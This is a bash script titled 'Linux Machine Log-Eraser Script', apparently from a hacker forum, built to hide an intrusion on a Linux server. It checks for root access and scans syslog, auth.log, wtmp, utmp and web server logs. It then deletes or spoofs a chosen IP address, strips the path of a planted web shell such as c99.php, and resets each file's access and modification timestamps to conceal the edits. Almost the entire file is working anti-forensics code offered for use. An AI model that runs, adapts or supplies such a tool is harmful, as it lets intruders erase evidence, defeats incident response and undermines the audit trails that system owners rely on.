#!/bin/bash

clear
cat << EOF

################################################################################
		    Linux Machine Log-Eraser Script
			Ver 0.1 - First Release

				Greetz to:
	 	Garage4Hackers (www.garage4hackers.com)
	 	
		Usage: $0
################################################################################
EOF
#echo "May 2011"
# Scroll to the end of code to see the progrom flow

#######################
# Declaration of an array containing the absolute path of log files. Add in more path per your requirements
# Since declared outside any function, this is a global variable
# declare -r makes our array read-only and could not be altered anywhere in the code following the declaration
#######################

declare -r system_log_files=(
			'/var/log/lastlog'		# Data file
			'/var/log/syslog'		# ASCII file
			'/var/log/messages'		# ASCII file
			'/var/log/httpd/access_log'	
			'/var/log/httpd/error_log'
			'/var/log/wtmp'			# Data file
			'/var/log/btmp'
			'/var/log/secure'
			'/var/log/xferlog'
			'/var/log/auth.log'		# ASCII file
			'/var/run/utmp'			# Data file (Binary)
			
			# Check syslog.conf for more log files
			# Remove .history files
			# /var/log/faillog
			# /var/log/acc			has info about all running programs
			# /root/.bash_history or the relevent one to the attacker
			)

# The following array would only store the names of the log files found on system
# Not making it read-only as it has to be edited later inside system_info code
found_log_files=()
rtr=""				# A global variable needed to get array back as a return value from "check_time_stamping" function
flag=0				# A global variable to determine inside "edit_file_and_timestamping" function that call to this function has been made from which function among "delete_ip" or "spoof_ip" or "delete_shell_path" etc.

#######################
# Function Declarations
#######################

# Basic System Information and check for log files existence
system_info ()
{
	echo -e "\n>>>>>>>>>>>>> System Info <<<<<<<<<<<< \n"
	echo -e "[*] Linux Kernel: `uname -a`"
	
	echo -e "\n[*] The various log files found on system:"
	j=0
	
	for i in ${system_log_files[@]}				# Accessing all the array entries declared on the top
	do
		if [ -f $i ]; then
			echo -e "\t\t$i"
			found_log_files[ $j ]=$i		# fetching the found log files to our empty array
			j=$[$j + 1]
		fi
	done
}

# Information of User privileges
login_info ()
{
	echo -e "\n\n>>>>>>>>>> Login User Info <<<<<<<<<<\n"
	echo -e "[*] Logged in Users:\n`who`"
	
	#### Checking UID value ####
	if [ "$UID" == "0" ]
	then
		echo -e "\n[*] You are logged in as user '`whoami`' and have 'root' access on this machine"
		echo "  First UID if"
	
	#### Checking read access to /etc/shadow ####	
	elif [ -r /etc/shadow ]
	then
		echo -e "\n[*] You are logged in as user '`whoami`' and have 'root' access on this machine"
		echo "  2nd shadow if"

	#### Checking the gid value ####
	elif [ "`cat /etc/passwd | grep whoami | cut -d : -f4`" == "0" ]
	then
		echo -e "\n[*] You are logged in as user '`whoami`' and have 'root' access on this machine"
		echo "  3rd GID if"
		 
	else
		echo -e "\n[*] You are logged in as user '`whoami`' and do not have 'root' access on this machine"
		call_exit
	fi
	
	echo -e "[*] You are a member of groups: `groups $whoami`"
}

# A function to exit from the program
call_exit ()
{
	echo -e "\n[*] Exiting.....\n"
	exit
}

smart ()		# Function is not complete yet
{
	echo -e "\n[*] The implementation of this (smart) function is pending"
	call_exit
	#if [ -r ./temp.txt ]
	#then
	#	echo "smart file exists"
	#else
	#	echo -e "\nWoops! No setting file could be found"
	#	echo "Info: "
	#	echo -e "Under Smart Manipulation, you need to create a text file with one entry per line"
	#	echo -e " >> Enter the IP/IPs to be searched and deleted from logs, one IP per line"
	#	echo -e " >> Enter the web shell path to be searched and deleted from logs, one path per line"
	#	echo -e " >> Your (user + host) name would be searched and the activity logs would be deleted"
	#	echo -e " >> All the edited files would be taken care of time stamping"
	#	echo -e "Go and create "temp.txt" in the current directory and fetch the required info"
	#	echo -e "\nQuiting....\n"
	#fi	
}

##################
# The following functions are part of "Manual Manipulation
##################



# A function to verify the IP fetched to be deleted or spoofed
# Hey! I have put in many checks to validate the IP but still there are some left and I am aware of them. (e.g. Put just 3 dots ...)
# So don't be an arse hole and run the code sensibly.
verify_ip ()
{
# First check is to verify that the chars entered as IP are integers
# Second check has been made to confirm that only 3 dots are there in IP address
# Third check is to mark the valid IP range. The octect value can not be < 0 or > 255

	str="$1"			# $1 is the first function parameter i.e. IP address here
	cnt=${#str}			# Counting the length of string fetched i.e total chars in IP address, including dots

#	echo -e "\nLength of IP is: $cnt"
	dot_counter=0
	
	for ((i=0; i < cnt; i++))
	do
		char=${str:$i:1}	# Reading one character at a time from the input string. Taken from http://www.unix.com/unix-dummies-questions-answers/80215-access-each-character-string.html
	#code=`printf %s "$char" | od -An -vtu1 | sed 's/^[^1-9]*//'`  # copied from http://unix.derkeiler.com/Newsgroups/comp.unix.shell/2004-08/0195.html

		code=`printf '%d' "'$char"`	# Echo the ASCII value of character
	# The first check
#		echo "code: " $code
		if [ $code -lt 48 ] || [ $code -gt 57 ] 	# Comparing the ASCII value range of Intergers ( 48 - 57 )
		then
			if [ $code -ne 46 ]			# To check the "." value
			then
				echo -e "\n[*] Err!!! Not a valid IP (some non-integer characters), try again.....\n"
				if [ $flag == 1 ]
				then
					delete_ip			# The function has been called again
				elif [ $flag == 2 ]
				then
					spoof_ip
				else
					echo "\nWrong value for flag...exiting"
					call_exit
				fi
			else
				dot_counter=$[$dot_counter + 1]		# j=$[$j + 1]
#			echo "Counter for dots: $dot_counter"
			fi
		fi
	done
#	echo "coutner-dtos: $dot_counter"
	# The second check
	if [ $dot_counter -ne 3 ]
	then
		echo "Inside counter check if"
		echo -e "\n[*] Err!!! Not a valid IP (check the number of dots in IP Address), try again.....\n"
		if [ $flag == 1 ]
		then
			delete_ip			# The function has been called again
		elif [ $flag == 2 ]
		then
			spoof_ip
		else
			echo "\nWrong value for flag...exiting"
			call_exit
		fi
	fi

	# The third check
# Extract the octets
	#echo "The IP fetched to verify is: $1"
	octet_a=`echo $1 | cut -d "." -f1`
	octet_b=`echo $1 | cut -d "." -f2`
	octet_c=`echo $1 | cut -d "." -f3`
	octet_d=`echo $1 | cut -d "." -f4`

	if [ \( $octet_a -lt 0 -o $octet_a -gt 255 \) -o \( $octet_b -lt 0 -o $octet_b -gt 255 \) -o \( $octet_c -lt 0 -o $octet_c -gt 255 \) -o \( $octet_d -lt 0 -o $octet_d -gt 255 \) ]
	then
		echo -e "\n[*] Err!!! Not a valid IP (octet value >=0 and <=255), try again.....\n"
		if [ $flag == 1 ]
		then
			delete_ip			# The function has been called again
		elif [ $flag == 2 ]
		then
			spoof_ip
		else
			echo "\nWrong value for flag...exiting"
			call_exit
		fi
	fi
}


# A function to obtain the original time stamping of the log file before editing the file
check_time_stamping ()
{
  	echo -e "\n[*] Inside check_time_stamping function"
	filename=$1
#    	echo -e "\nFile: '${1}'"
	echo -e "File: $filename"
	
	local atime=`stat -c "%x~%y~%z" ${filename} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	local mtime=`stat -c "%x~%y~%z" ${filename} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	#local ctime=`stat -c "%x~%y~%z" ${filename} | cut -d "~" -f3 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		
	#echo "atime: $atime"
	#echo "mtime: $mtime"
	#echo "ctime: $ctime"

	local array=()
	#array=($atime $mtime $ctime)
	array=($atime $mtime)
	rtr=(${array[@]})				# rtr is a global variable
}


# The function to edit the log files and restore the Time (time stamping)
edit_file_and_timestamping ()
{
	for log_file in ${found_log_files[@]}		# It's a global array and declared at the top of code
	do
	# Calling check_time_stamping function to get the original time stamps before touching the files	
		check_time_stamping $log_file
		out=(${rtr[@]})
		atime=${out[0]}
		mtime=${out[1]}
	#	ctime=${out[2]}
		
		echo -e "\n\n[*] Inside edit_file_and_timestamping function"
		echo -e "\n[*] Time Stamping before editing the log file"
		echo "atime: $atime"
		echo "mtime: $mtime"
	#		echo "ctime: $ctime"
	
# Edit only that file which has the desired string/IP in it. Don't touch others unnecessary.
# The following if and grep stuff does this only. If found the IP in it, then edit else don't	
		if grep -qsw "$1" "$log_file"	# $1 is the parameter passed to this function
		then
# -w is needed else if you intend to delete 192.168.1.1, it would delete all 192.168.1.1* as well
			echo -e "\n\n[*] The IP found in $log_file ... so proceeding editing it"
			echo "Sleeping for 5 sec"
			sleep 5
			
			echo -e "\n[*] Editing log file --> $log_file"

			if [ $flag -eq 1 ]			# i.e. if called from delete_ip function
			then
				echo -e "\nflag = 1, deleting IP"
				sed "s/$1//g" $log_file > $log_file.new
				mv $log_file.new $log_file
			elif [ $flag -eq 2 ] 			# i.e if called from spoof_ip function
			then
				echo -e "\nflag = 2, spoofing IP"
				sed "s/$1/$2/g" $log_file > $log_file.new
				mv $log_file.new $log_file
			elif [ $flag -eq 3 ] 			# i.e. if called from delete_shell_path
			then
				echo -e "\nflag = 3, deleting Backdoor Shell PATH"
				sed "s/$1//g" $log_file > $log_file.new
				mv $log_file.new $log_file
			else
				echo "\nWrong value for variable 'flag'....quiting"
				exit
			fi
		else
			echo "[*] The IP not found in $log_file ... so proceeding with next log file"
			echo "Sleeping for 3 sec"
			sleep 5
				#continue
		fi
# The following time stamping is necessary irrespective of whether the IP was found in file or not.
# Because at least the file has been accessed while grep(ing) to search the content
# So the atime atleast has to be restored
# Restoring mtime as well in either case though with more code it can be skipped if value is not found in log file
		
		aatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		amtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	#	actime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f3 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n\nTime Stamping after editing the log file"
		echo "atime: $aatime"
		echo "mtime: $amtime"
	#	echo "ctime: $actime"

		echo -e "\nRestoring the time stamp........."
		touch -at $atime $log_file 
		touch -mt $mtime $log_file
		#touch -ct $ctime $log_file

		aaatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		aamtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	#	aactime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f3 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\nTime Stamping after restoring the time stamp"
		echo "atime: $aaatime"
		echo "mtime: $aamtime"
	#	echo "ctime: $aactime"
		echo -e "\n======================================================================\n\n"		
	done
	
}

# A function to delete the IP from the logs
delete_ip ()
{
	flag=1					# Set flag to 1, it's a global variable
	echo -e "\n[*] Inside delete_ip function"
	echo -e -n "\tPass the IP Address you wish to delete from the log files or E to exit: "
	read ip_to_be_deleted
	
	if [ \( $ip_to_be_deleted == 'e' -o $ip_to_be_deleted == 'E' \) ]
	then
		call_exit
	fi

	echo "[*] Verifying IP........"
	verify_ip $ip_to_be_deleted		# Passing the fetched IP as argument to verify_ip function
	echo "[*] IP Verified"

	echo -e "\n[*] Proceeding to Time stamping and file editing"

	
	edit_file_and_timestamping $ip_to_be_deleted
	exit
}

# A function to spoof a IP in the logs
spoof_ip ()
{
	flag=2					# Set flag to 2, it's a global variable
	echo -e "\nInside spoof_ip function"
	echo -e -n "Pass the original IP or E to exit: "
	read original_ip

	if [ \( $original_ip == 'e' -o $original_ip == 'E' \) ]
	then
		call_exit
	fi

	echo -e -n "Pass Spoof IP or E to exit: "
	read spoof_ip

	if [ \( $spoof_ip == 'e' -o $spoof_ip == 'E' \) ]
	then
		call_exit
	fi
	
	echo -e "\nVerifying original IP........"
	verify_ip $original_ip
	echo "original IP: $original_ip verified"

	echo -e "\nVerifying spoof IP........"
	verify_ip $spoof_ip
	echo "spoofed-IP: $spoof_ip verified"

	echo -e "\nProceeding to Time stamping and file editing"
	
	
	edit_file_and_timestamping $original_ip $spoof_ip
	exit
}

# A function to delete the entry of a backdoor shell from the web logs
delete_shell_path ()
{
	flag=3					# Set flag to 3, it's a global variable
	echo -e "\n[*] Inside delete_shell_path function"
	echo -e -n "Enter the full or trailing part of your shell (/www/site/upload/c99.php) or E to exit: "
	read shell_path

	if [ \( $shell_path == 'e' -o $shell_path == 'E' \) ]
	then
		call_exit
	fi

	echo "shell_path: $shell_path"
	
	echo -e "\n[*] Proceeding to Time stamping and file editing"
	
	
	edit_file_and_timestamping $shell_path
	exit
}

# A function to delete the activity logs of the user
delete_user_logs ()
{
	
	echo -e "\n[*] The implementation of this (delete_user_logs) function is pending"
	call_exit
}

manual ()
{
cat << EOF
	
	[*] Info:
	Under Manual Manipulation, you have the following options:

	1. Search and Delete a particular IP from the logs
		e.g IP: 192.168.1.2

	2. Search and Replace a particular IP in the logs to spoof your IP
		e.g Original_IP Spoof_IP: 192.168.1.2 192.168.22.5

	3. Search and Delete a particular web shell (backdoor) path from the web logs
		e.g Backdoor shell path: www.xyz.com/shell-path/c99.php

	4. Search and Delete a particular user activity logs from history and all
		e.g Username: test

	5. Press E to exit
EOF
	#6. blah blah ---> find which log file has ur entry
	#7. Stop logging? Delete history commands, not whole file
	

	echo -e -n "\nSelect option: 1 | 2 | 3 | 4 | E: "
	read option

	case $option in
	1)
		delete_ip 
		;;

	2)
		spoof_ip
		;;

	3)
		delete_shell_path
		;;
	
	4)
		delete_user_logs
		;;

	e | E)
		echo -e "\n[*] Exiting without making you loose your shell....."
		call_exit
		;;

	*)
		echo -e "\n[*] Err! Should have chosen either of them."
		call_exit
		;;
	esac
}

erase_logs ()
{
	echo -e "\n\n>>>>>>>>>>>>> Erase logs <<<<<<<<<<<<\n"
	echo -e ">>> Choose among the following:\n"
	echo -e "1. Smart(S) Manipulation"
	echo -e "2. Manual(M) Manipulation"
	echo -e "3. Press E to exit"
	echo -e -n "Select option: S | M | E: "
	read option

	
	case $option in
	s | S)
		echo -e "\n[*] Calling Smart Function....."
		smart
		;;

	m | M)
		echo -e "\n[*] Calling Manual Function....."
		manual
		;;

	e | E)
		echo -e "\n[*] Exiting without making you loose your shell....."
		call_exit
		;;

	*)
		echo -e "\n[*] Err! Should have chosen either of them."
		call_exit
		;;
	esac
	
}

echo
system_info							# Call to system_info function
login_info							# Call to login_info function
erase_logs							# Call to erase_logs function
